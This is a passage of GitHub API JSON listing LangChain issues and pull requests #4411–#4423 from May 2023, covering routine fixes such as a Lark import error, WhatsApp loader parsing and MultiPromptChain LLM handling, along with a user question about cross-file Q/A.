        "body": "### Issue you'd like to raise.\n\nI want to do Q/A with csv agent and multiple txt files at the same time. But I do not want to use csv loader and txt loader because they did not perform very well when handling cross file scenario. For example, the model needs to find answers from both the csv and txt file and then return the result.\r\n\r\nHow should I do it? I think I may need to create a custom agent.\n\n### Suggestion:\n\n_No response_",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4423/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4423/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4422",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4422/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4422/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4422/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4422",
        "id": 1702807254,
        "node_id": "PR_kwDOIPDwls5QIoCr",
        "number": 4422,
        "title": "Harrison/plan and solve",
        "user": {
            "login": "hwchase17",
            "id": 11986836,
            "node_id": "MDQ6VXNlcjExOTg2ODM2",
            "avatar_url": "https://avatars.githubusercontent.com/u/11986836?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/hwchase17",
            "html_url": "https://github.com/hwchase17",
            "followers_url": "https://api.github.com/users/hwchase17/followers",
            "following_url": "https://api.github.com/users/hwchase17/following{/other_user}",
            "gists_url": "https://api.github.com/users/hwchase17/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/hwchase17/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/hwchase17/subscriptions",
            "organizations_url": "https://api.github.com/users/hwchase17/orgs",
            "repos_url": "https://api.github.com/users/hwchase17/repos",
            "events_url": "https://api.github.com/users/hwchase17/events{/privacy}",
            "received_events_url": "https://api.github.com/users/hwchase17/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T21:57:54Z",
        "updated_at": "2023-05-10T04:07:57Z",
        "closed_at": "2023-05-10T04:07:56Z",
        "author_association": "COLLABORATOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4422",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4422",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4422.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4422.patch",
            "merged_at": "2023-05-10T04:07:56Z"
        },
        "body": "# Your PR Title (What it does)\r\n\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n<!-- Remove if not applicable -->\r\n\r\nFixes # (issue)\r\n\r\n## Before submitting\r\n\r\n<!-- If you're adding a new integration, include an integration test and an example notebook showing its use! -->\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4422/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4422/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4421",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4421/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4421/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4421/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4421",
        "id": 1702805747,
        "node_id": "PR_kwDOIPDwls5QIns9",
        "number": 4421,
        "title": "Fix Lark import error",
        "user": {
            "login": "dev2049",
            "id": 130488702,
            "node_id": "U_kgDOB8cZfg",
            "avatar_url": "https://avatars.githubusercontent.com/u/130488702?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dev2049",
            "html_url": "https://github.com/dev2049",
            "followers_url": "https://api.github.com/users/dev2049/followers",
            "following_url": "https://api.github.com/users/dev2049/following{/other_user}",
            "gists_url": "https://api.github.com/users/dev2049/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dev2049/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dev2049/subscriptions",
            "organizations_url": "https://api.github.com/users/dev2049/orgs",
            "repos_url": "https://api.github.com/users/dev2049/repos",
            "events_url": "https://api.github.com/users/dev2049/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dev2049/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T21:56:24Z",
        "updated_at": "2023-05-10T08:07:35Z",
        "closed_at": "2023-05-10T08:07:34Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4421",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4421",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4421.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4421.patch",
            "merged_at": "2023-05-10T08:07:34Z"
        },
        "body": "Any import that touches langchain.retrievers currently requires Lark. Here's one attempt to fix. Not very pretty, very open to other ideas. Alternatives I thought of are 1) make Lark requirement, 2) put everything in parser.py  in the try/except. Neither sounds much better\r\n\r\nRelated to #4316, #4275",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4421/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4421/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4420",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4420/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4420/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4420/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4420",
        "id": 1702775105,
        "node_id": "PR_kwDOIPDwls5QIhNA",
        "number": 4420,
        "title": "Update WhatsAppChatLoader to include the character ~ in the sender name",
        "user": {
            "login": "ruravi",
            "id": 1093899,
            "node_id": "MDQ6VXNlcjEwOTM4OTk=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1093899?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ruravi",
            "html_url": "https://github.com/ruravi",
            "followers_url": "https://api.github.com/users/ruravi/followers",
            "following_url": "https://api.github.com/users/ruravi/following{/other_user}",
            "gists_url": "https://api.github.com/users/ruravi/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ruravi/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ruravi/subscriptions",
            "organizations_url": "https://api.github.com/users/ruravi/orgs",
            "repos_url": "https://api.github.com/users/ruravi/repos",
            "events_url": "https://api.github.com/users/ruravi/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ruravi/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T21:23:12Z",
        "updated_at": "2023-05-09T22:00:05Z",
        "closed_at": "2023-05-09T22:00:05Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4420",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4420",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4420.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4420.patch",
            "merged_at": "2023-05-09T22:00:05Z"
        },
        "body": "# Update WhatsAppChatLoader to include the character ~ in the sender name\r\n\r\nFixes #4153\r\n\r\nIf the sender of a message in a group chat isn't in your contact list, they will appear with a ~ prefix in the exported chat. This PR adds support for parsing such lines.\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested: @eyurtsev @hp0404 @dev2049 \r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4420/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4420/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4418",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4418/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4418/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4418/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4418",
        "id": 1702730631,
        "node_id": "PR_kwDOIPDwls5QIXs0",
        "number": 4418,
        "title": "Use passed LLM for default chain in MultiPromptChain",
        "user": {
            "login": "jrhe",
            "id": 4038905,
            "node_id": "MDQ6VXNlcjQwMzg5MDU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/4038905?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jrhe",
            "html_url": "https://github.com/jrhe",
            "followers_url": "https://api.github.com/users/jrhe/followers",
            "following_url": "https://api.github.com/users/jrhe/following{/other_user}",
            "gists_url": "https://api.github.com/users/jrhe/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jrhe/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jrhe/subscriptions",
            "organizations_url": "https://api.github.com/users/jrhe/orgs",
            "repos_url": "https://api.github.com/users/jrhe/repos",
            "events_url": "https://api.github.com/users/jrhe/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jrhe/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2023-05-09T20:44:39Z",
        "updated_at": "2023-05-09T23:15:26Z",
        "closed_at": "2023-05-09T23:15:26Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4418",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4418",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4418.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4418.patch",
            "merged_at": "2023-05-09T23:15:26Z"
        },
        "body": "# Fix: Use passed LLM for the default chain in MultiPromptChain\r\n\r\nCurrently, MultiPromptChain instantiates a ChatOpenAI LLM instance for the default chain to use if none of the prompts passed match. This seems like an error as it means that you can't use your choice of LLM, or configure how to instantiate the default LLM (e.g. passing in an API key that isn't in the usual env variable). \r\n\r\n## Who can review?\r\n\r\n@hwchase17 @agola11 ",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4418/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4418/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4417",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4417/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4417/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4417/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4417",
        "id": 1702693707,
        "node_id": "PR_kwDOIPDwls5QIQAr",
        "number": 4417,
        "title": "Make `lark` a required dependency",
        "user": {
            "login": "oddrationale",
            "id": 80038,
            "node_id": "MDQ6VXNlcjgwMDM4",
            "avatar_url": "https://avatars.githubusercontent.com/u/80038?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/oddrationale",
            "html_url": "https://github.com/oddrationale",
            "followers_url": "https://api.github.com/users/oddrationale/followers",
            "following_url": "https://api.github.com/users/oddrationale/following{/other_user}",
            "gists_url": "https://api.github.com/users/oddrationale/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/oddrationale/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/oddrationale/subscriptions",
            "organizations_url": "https://api.github.com/users/oddrationale/orgs",
            "repos_url": "https://api.github.com/users/oddrationale/repos",
            "events_url": "https://api.github.com/users/oddrationale/events{/privacy}",
            "received_events_url": "https://api.github.com/users/oddrationale/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2023-05-09T20:13:26Z",
        "updated_at": "2023-05-09T22:40:34Z",
        "closed_at": "2023-05-09T22:40:22Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4417",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4417",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4417.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4417.patch",
            "merged_at": null
        },
        "body": "# Make `lark` a required dependency\r\n\r\nMake `lark` a required dependency since it is required by `langchain.chains.query_constructor.parser`.\r\n\r\nFixes #4275 and fixes #4316\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n- @hwchase17\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4417/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4417/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4416",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4416/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4416/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4416/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4416",
        "id": 1702648331,
        "node_id": "PR_kwDOIPDwls5QIGVO",
        "number": 4416,
        "title": "Add Milvus and Zilliz Retrievals",
        "user": {
            "login": "filip-halt",
            "id": 81822489,
            "node_id": "MDQ6VXNlcjgxODIyNDg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/81822489?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/filip-halt",
            "html_url": "https://github.com/filip-halt",
            "followers_url": "https://api.github.com/users/filip-halt/followers",
            "following_url": "https://api.github.com/users/filip-halt/following{/other_user}",
            "gists_url": "https://api.github.com/users/filip-halt/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/filip-halt/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/filip-halt/subscriptions",
            "organizations_url": "https://api.github.com/users/filip-halt/orgs",
            "repos_url": "https://api.github.com/users/filip-halt/repos",
            "events_url": "https://api.github.com/users/filip-halt/events{/privacy}",
            "received_events_url": "https://api.github.com/users/filip-halt/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2023-05-09T19:35:19Z",
        "updated_at": "2023-05-16T04:22:54Z",
        "closed_at": "2023-05-16T04:22:54Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4416",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4416",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4416.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4416.patch",
            "merged_at": "2023-05-16T04:22:54Z"
        },
        "body": "Adds the basic retrievers for Milvus and Zilliz. Hybrid search support will be added in the future.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4416/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4416/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4415",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4415/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4415/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4415/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4415",
        "id": 1702543987,
        "node_id": "PR_kwDOIPDwls5QHvgm",
        "number": 4415,
        "title": "Improve math chain error msg",
        "user": {
            "login": "vowelparrot",
            "id": 130414180,
            "node_id": "U_kgDOB8X2ZA",
            "avatar_url": "https://avatars.githubusercontent.com/u/130414180?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/vowelparrot",
            "html_url": "https://github.com/vowelparrot",
            "followers_url": "https://api.github.com/users/vowelparrot/followers",
            "following_url": "https://api.github.com/users/vowelparrot/following{/other_user}",
            "gists_url": "https://api.github.com/users/vowelparrot/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/vowelparrot/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/vowelparrot/subscriptions",
            "organizations_url": "https://api.github.com/users/vowelparrot/orgs",
            "repos_url": "https://api.github.com/users/vowelparrot/repos",
            "events_url": "https://api.github.com/users/vowelparrot/events{/privacy}",
            "received_events_url": "https://api.github.com/users/vowelparrot/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T18:28:12Z",
        "updated_at": "2023-05-10T08:08:02Z",
        "closed_at": "2023-05-10T08:08:01Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4415",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4415",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4415.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4415.patch",
            "merged_at": "2023-05-10T08:08:01Z"
        },
        "body": null,
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4415/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4415/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4414",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4414/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4414/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4414/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4414",
        "id": 1702496254,
        "node_id": "PR_kwDOIPDwls5QHkyg",
        "number": 4414,
        "title": "[GoogleSerperAPIWrapper] fix bug in result parsing(_parse_results)",
        "user": {
            "login": "luanjunyi",
            "id": 93208,
            "node_id": "MDQ6VXNlcjkzMjA4",
            "avatar_url": "https://avatars.githubusercontent.com/u/93208?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/luanjunyi",
            "html_url": "https://github.com/luanjunyi",
            "followers_url": "https://api.github.com/users/luanjunyi/followers",
            "following_url": "https://api.github.com/users/luanjunyi/following{/other_user}",
            "gists_url": "https://api.github.com/users/luanjunyi/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/luanjunyi/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/luanjunyi/subscriptions",
            "organizations_url": "https://api.github.com/users/luanjunyi/orgs",
            "repos_url": "https://api.github.com/users/luanjunyi/repos",
            "events_url": "https://api.github.com/users/luanjunyi/events{/privacy}",
            "received_events_url": "https://api.github.com/users/luanjunyi/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5454193895,
                "node_id": "LA_kwDOIPDwls8AAAABRRhk5w",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/lgtm",
                "name": "lgtm",
                "color": "0E8A16",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T18:04:13Z",
        "updated_at": "2023-05-22T16:03:44Z",
        "closed_at": "2023-05-18T04:13:02Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4414",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4414",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4414.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4414.patch",
            "merged_at": "2023-05-18T04:13:02Z"
        },
        "body": "# Parse news search result in GoogleSerperAPIWrapper.run\r\n\r\n\r\nGoogleSerperAPIWrapper's parser method, _parse_results, assumes the result list is under the key \"organic\". For other search types (news, places, images), the key is not \"organic\". Before this PR, calling the run() from GoogleSerperAPIWrapper with other types than \"search\" will throw exception because \"organic\" doesn't exist in the API response.\r\n\r\n\r\n\r\n## Who can review?\r\n\r\n@rogerserper \r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4414/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4414/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4413",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4413/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4413/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4413/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4413",
        "id": 1702489200,
        "node_id": "PR_kwDOIPDwls5QHjN8",
        "number": 4413,
        "title": "Fix nested runs example ID",
        "user": {
            "login": "vowelparrot",
            "id": 130414180,
            "node_id": "U_kgDOB8X2ZA",
            "avatar_url": "https://avatars.githubusercontent.com/u/130414180?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/vowelparrot",
            "html_url": "https://github.com/vowelparrot",
            "followers_url": "https://api.github.com/users/vowelparrot/followers",
            "following_url": "https://api.github.com/users/vowelparrot/following{/other_user}",
            "gists_url": "https://api.github.com/users/vowelparrot/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/vowelparrot/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/vowelparrot/subscriptions",
            "organizations_url": "https://api.github.com/users/vowelparrot/orgs",
            "repos_url": "https://api.github.com/users/vowelparrot/repos",
            "events_url": "https://api.github.com/users/vowelparrot/events{/privacy}",
            "received_events_url": "https://api.github.com/users/vowelparrot/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T18:00:22Z",
        "updated_at": "2023-05-09T19:21:54Z",
        "closed_at": "2023-05-09T19:21:53Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4413",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4413",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4413.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4413.patch",
            "merged_at": "2023-05-09T19:21:53Z"
        },
        "body": "#### Only reference example ID on the parent run\r\n\r\nPreviously, I was assigning the example ID to every child run. \r\nAdds a test.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4413/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4413/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4412",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4412/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4412/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4412/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4412",
        "id": 1702457675,
        "node_id": "PR_kwDOIPDwls5QHcYJ",
        "number": 4412,
        "title": "Delete comment",
        "user": {
            "login": "dev2049",
            "id": 130488702,
            "node_id": "U_kgDOB8cZfg",
            "avatar_url": "https://avatars.githubusercontent.com/u/130488702?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dev2049",
            "html_url": "https://github.com/dev2049",
            "followers_url": "https://api.github.com/users/dev2049/followers",
            "following_url": "https://api.github.com/users/dev2049/following{/other_user}",
            "gists_url": "https://api.github.com/users/dev2049/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dev2049/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dev2049/subscriptions",
            "organizations_url": "https://api.github.com/users/dev2049/orgs",
            "repos_url": "https://api.github.com/users/dev2049/repos",
            "events_url": "https://api.github.com/users/dev2049/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dev2049/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T17:38:39Z",
        "updated_at": "2023-05-09T17:38:45Z",
        "closed_at": "2023-05-09T17:38:44Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4412",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4412",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4412.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4412.patch",
            "merged_at": "2023-05-09T17:38:44Z"
        },
        "body": null,
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4412/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4412/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4411",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4411/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4411/comments",
